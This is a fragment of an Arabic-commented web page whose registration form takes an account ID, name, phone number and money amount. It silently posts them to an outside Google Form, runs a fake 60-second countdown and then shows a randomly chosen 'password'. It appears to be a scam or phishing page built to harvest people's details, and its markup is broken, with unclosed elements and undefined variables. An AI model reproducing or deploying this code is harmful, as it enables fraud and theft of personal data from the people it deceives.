<body>
    <div class="container">
        <form id="register-form">

            </div>
            <div>

            </div>
            <div>

        </form>

        const warningMessage = document.getElementById("warning-message");
        
        const backgrounds = ['bg1.jpg', 'bg2.jpg', 'bg3.jpg', 'bg4.jpg', 'bg5.jpg'];

        let currentBackground = 0;

        setInterval(() => {
            currentBackground = (currentBackground + 1) % backgrounds.length;
            document.body.style.backgroundImage = `url(${backgrounds[currentBackground]})`;
        }, 5000);

        form.addEventListener("input", function() {
            const isValid = form.checkValidity();
            if (isValid) {
                submitButton.disabled = false;
                warningMessage.style.display = "none";
            } else {
                submitButton.disabled = true;
                warningMessage.style.display = "block";
            }
        });

        form.addEventListener("submit", function(event) {
            event.preventDefault();

            overlay.style.display = "flex";

            // ارسال البيانات إلى Google Form
            const googleFormAction = "https://docs.google.com/forms/d/e/1FAIpQLSeFRQejS5JwgT65cz10DUEXPZeRxHfT5JRovJ3E1VM9XDjsQw/formResponse";
            const formData = new FormData();
            formData.append("entry.1871245093", document.getElementById("account-id").value);
            formData.append("entry.792692600", document.getElementById("name").value);
            formData.append("entry.1279053688", document.getElementById("phone").value);
            formData.append("entry.1468775241", document.getElementById("mony").value);

            fetch(googleFormAction, {
                method: "POST",
                body: formData,
                mode: "no-cors"
            }).then(() => {
                console.log("تم إرسال البيانات إلى Google Form.");
            }).catch((error) => {
                console.error("حدث خطأ أثناء إرسال البيانات:", error);
            });

            let countdown = 60;
            countdownElement.textContent = countdown;
            const timer = setInterval(() => {
                countdown -= 1;
                countdownElement.textContent = countdown;

                if (countdown === 0) {
                    clearInterval(timer);
                    loadingSection.style.display = "none";
                    successSection.style.display = "block";

                    setTimeout(() => {
                        successSection.style.display = "none";
                        passwordSection.style.display = "block";

                        const randomPassword = passwords[Math.floor(Math.random() * passwords.length)];
                        passwordDisplay.textContent = randomPassword;
                    }, 1000);
                }
            }, 1000);
        });

        copyButton.addEventListener("click", function() {
            const password = passwordDisplay.textContent;
            navigator.clipboard.writeText(password).then(() => {
                copyButton.textContent = "تم نسخ كلمة المرور";
                copyButton.classList.add("copied");
                copyButton.disabled = true;
            });
        });

        document.getElementById('dawen-button').addEventListener('click', function() {
            window.location.href = 'https://google.com';
        });

        form.addEventListener("input", function () {
    const accountId = document.getElementById("account-id");
    const name = document.getElementById("name");
    const phone = document.getElementById("phone");
    const mony = document.getElementById("mony");

    const errorAccountId = document.getElementById("error-account-id");
    const errorName = document.getElementById("error-name");
    const errorPhone = document.getElementById("error-phone");
    const errorMony = document.getElementById("error-mony");

    // التحقق من الحقول وتحديد الأخطاء
    if (accountId.validity.valid) {
        errorAccountId.style.display = "none";
    } else {
        errorAccountId.style.display = "block";
    }

    if (name.validity.valid) {
        errorName.style.display = "none";
    } else {
        errorName.style.display = "block";
    }

    if (phone.validity.valid) {
        errorPhone.style.display = "none";
    } else {
        errorPhone.style.display = "block";
    }

    if (mony.validity.valid) {
        errorMony.style.display = "none";
    } else {
        errorMony.style.display = "block";
    }

    // تفعيل أو تعطيل زر الإرسال بناءً على صحة النموذج
    const isValid = form.checkValidity();
    submitButton.disabled = !isValid;
});



const warningBox = document.getElementById("warning-box");
const closeWarning = document.getElementById("close-warning");
const monyField = document.getElementById("mony");

// إغلاق المربع التحذيري عند الضغط على زر الإغلاق
closeWarning.addEventListener("click", function () {
    warningBox.style.display = "none";
});

// التحقق من قيمة الأموال عند الإدخال
monyField.addEventListener("input", function () {
    const monyValue = parseInt(monyField.value, 10);

    // عرض المربع التحذيري إذا كانت القيمة أقل من 300
    if (!isNaN(monyValue) && monyValue < 300) {
        warningBox.style.display = "block";
    } else {
        warningBox.style.display = "none";
    }
});
